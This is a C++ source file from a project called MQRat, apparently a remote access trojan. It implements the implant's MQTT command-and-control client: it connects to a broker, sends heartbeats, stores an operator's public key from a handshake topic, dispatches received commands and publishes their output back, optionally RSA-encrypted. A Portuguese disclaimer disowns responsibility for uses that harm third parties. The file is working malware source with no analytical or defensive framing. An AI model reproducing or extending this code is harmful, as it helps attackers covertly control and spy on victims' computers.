/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <iostream>
#include <string>
#include <thread>
#include <windows.h>
#include <openssl/rsa.h>
#include "paho/include/MQTTClient.h"
#include "paho/include/MQTTClientPersistence.h"
#include "command_dispatcher.hpp"
#include "mqtt_client.hpp"
#include "utils.hpp"
#include "log.hpp"
#include "command_dispatcher.hpp"
#include "wrappers.hpp"
#include "encoders/base64.hpp"
#include "crypto.hpp"
#include "key_manager.hpp"

using namespace std;

MqttClient::MqttClient() {
	this->qos = 0;
    this->client = nullptr;
    this->broker_host = "127.0.0.1";
    this->reconnect_timeout = 5000;
    dispatcher = new CommandDispatcher(nullptr, this, nullptr);
    manager = new KeyManager();
}

MqttClient::MqttClient(unsigned qos_level, string broker_hostname) {
	this->qos = qos_level;
    this->client = nullptr;
    this->broker_host = broker_hostname;
    this->reconnect_timeout = 5000;
    dispatcher = new CommandDispatcher(nullptr, this, nullptr);
    manager = new KeyManager();
}

MqttClient::MqttClient(unsigned qos_level, string broker_hostname, Crypto::RSACipher *cipher) {
	this->qos = qos_level;
    this->client = nullptr;
    this->broker_host = broker_hostname;
    this->reconnect_timeout = 5000;
    this->cipher = cipher;
    dispatcher = new CommandDispatcher(nullptr, this, nullptr);
    manager = new KeyManager();
}

MqttClient::~MqttClient() {
    Log::LogInfo("MQTT client finished");
    MQTTClient_free(this->client);
    delete manager;
}

bool MqttClient::Setup() {
	string client_id = Utils::GenerateID().c_str();

	Log::LogInfo("Setting up client to connect with: " + this->broker_host);
	Log::LogInfo("Client id: " + client_id);

    // Create MQTT client
    auto status = MQTTClient_create(&client, this->broker_host.c_str(), client_id.c_str(), MQTTCLIENT_PERSISTENCE_NONE, NULL);
    if(status != MQTTCLIENT_SUCCESS) {
        Log::LogPanic("Failed to create MQTT client: " + to_string(status));
    }

    // Configure callbacks
    auto c = MQTTClient_setCallbacks(client, this, Wrappers::onLost, Wrappers::onMsgReceived, Wrappers::onDelivered);
    if(c != MQTTCLIENT_SUCCESS) {
        Log::LogPanic("Failed to setup callbacks: " + to_string(c));
    }

    return true;
}


void MqttClient::Subscribe(string topic) {
	int status;
	
	Log::LogInfo("Subscribing to topic: " + topic);
	if((status = MQTTClient_subscribe(client, topic.c_str(), this->qos)) != MQTTCLIENT_SUCCESS) {
		Log::LogPanic("Failed to subscribe: " + to_string(status));
	}
}

void MqttClient::ConfigureOptions(void *m_options) {
    auto options = static_cast<MQTTClient_connectOptions*>(m_options);
    options->MQTTVersion = MQTTVERSION_3_1_1;
    options->connectTimeout = 10;
    options->cleansession = 0;
}

void MqttClient::Connect() {
    MQTTClient_connectOptions options = MQTTClient_connectOptions_initializer;

    // Try connect with broker
    if(client != NULL) {
        this->ConfigureOptions(&options);
		auto connect_status = MQTTClient_connect(client, &options);
        if(connect_status != MQTTCLIENT_SUCCESS) {
            Log::LogPanic("Failed to connect with broker: " + to_string(connect_status));
        }

        // Sends the heartbeat
        SendHeartbeat();
		
		Log::LogInfo("Connected with " + broker_host);
    }
}

void MqttClient::Loop() {
    while(true) {
		MQTTClient_yield();
        Sleep(this->yield_delay_ms);
    }
}

void MqttClient::Publish(string data, string topic, unsigned QoS, bool retained) {
	MQTTClient_deliveryToken token;
	auto delivery_timeout = 5000UL;
	
	if(topic.empty()) {
		Log::LogError("Empty topic name passed to publish function");
		return;
	}
	
	// Publishes the message
	MQTTClient_publish(client, topic.c_str(), data.length(), 
                    reinterpret_cast<const void*>(data.c_str()), QoS, retained, &token);
    
    Log::LogInfo("Waiting message to be published");

	// Wait for message delivery
	auto status = MQTTClient_waitForCompletion(client, token, delivery_timeout);	
    if(status != MQTTCLIENT_SUCCESS) {
        Log::LogError("Failed to publish data: " + status);
        return;
    }

	Log::LogInfo("Message published to topic " + topic);
}

void MqttClient::Publish(string data, string topic) {
    return Publish(data, topic, this->qos, false);
}

void MqttClient::Publish(vector<string> data, string topic)
{
    string payload = "";

    for(const auto& output : data) {
        payload += output + "\n";
    }

    // Publish to topic
    return this->Publish(payload, topic);
}

MQTTClient MqttClient::GetClient() {
    return client;
}

void MqttClient::OnConnectionLost(void *context, char *cause) {
    Log::LogError("Connection lost with broker. Reconnecting");
    Sleep(reconnect_timeout);
    this->Connect();
}

int MqttClient::OnMessageReceived(void *context, char *topic, int topic_len, void *message) {
	
    static bool pk_saved = false;

	Log::LogInfo("Message received on topic " + string(topic));

    auto msg = static_cast<MQTTClient_message*>(message);

    // Check if is the handshake message
    if(string(topic).find("/hs") != string::npos && !(pk_saved)) {
        // Save public key into disk
        manager->SavePublicKey(static_cast<char*>(msg->payload));
        pk_saved = true;

        return 0;
    }

    // Dispatch received command
    auto dp = static_cast<CommandDispatcher*>(dispatcher);
    
    dp->setMessage(msg);
    dp->setTopic(const_cast<char*>(getSendTopic().c_str()));
    dp->Dispatch();
	
	return 0;
}

void MqttClient::OnDelivered(void* context, MQTTClient_deliveryToken dt) {

}

void MqttClient::setSendTopic(std::string new_topic)
{
    this->send_topic = new_topic;
}

string MqttClient::getSendTopic()
{
    return this->send_topic;
}

void MqttClient::SendHeartbeat()
{
    const auto qualityOfService = 2;

    Publish(this->heartbeat_payload, getHeartbeatTopic(), qualityOfService, false);
}

string MqttClient::getRecvTopic()
{
    return this->recv_topic;
}

void MqttClient::setRecvTopic(string new_topic)
{
    this->recv_topic = new_topic;
}

void MqttClient::setHeartbeatTopic(string new_topic)
{
    this->heartbeat_topic = new_topic;
}

string MqttClient::getHeartbeatTopic()
{
    return this->heartbeat_topic;
}

void MqttClient::SendErrorEncrypted(Crypto::RSACipher *cipher)
{
    this->Publish("/error", this->getSendTopic());
}

void MqttClient::SendError()
{
    this->Publish("/error", this->getSendTopic());
}

void MqttClient::PublishEncrypted(string data, string topic)
{
    auto packet = reinterpret_cast<void*>(const_cast<char*>(data.c_str()));

    // Encrypt payload
    auto payload = cipher->Encrypt(packet, data.length());

    // Publish encrypted payload
    this->Publish(payload, topic);
}

void MqttClient::PublishEncrypted(vector<string> data, string topic)
{
    string payload;

    // Insert a new line character between elements
    for(auto c : data) {
        payload.append(c + "\n");    
    }

    return this->PublishEncrypted(payload, topic);
}

Crypto::RSACipher *MqttClient::getCipher()
{
    return this->cipher;
}

void MqttClient::setHandshakeTopic(string topic)
{
    this->handshake_topic = topic;
}

KeyManager *MqttClient::GetKeyManager() {
    return this->manager;
}
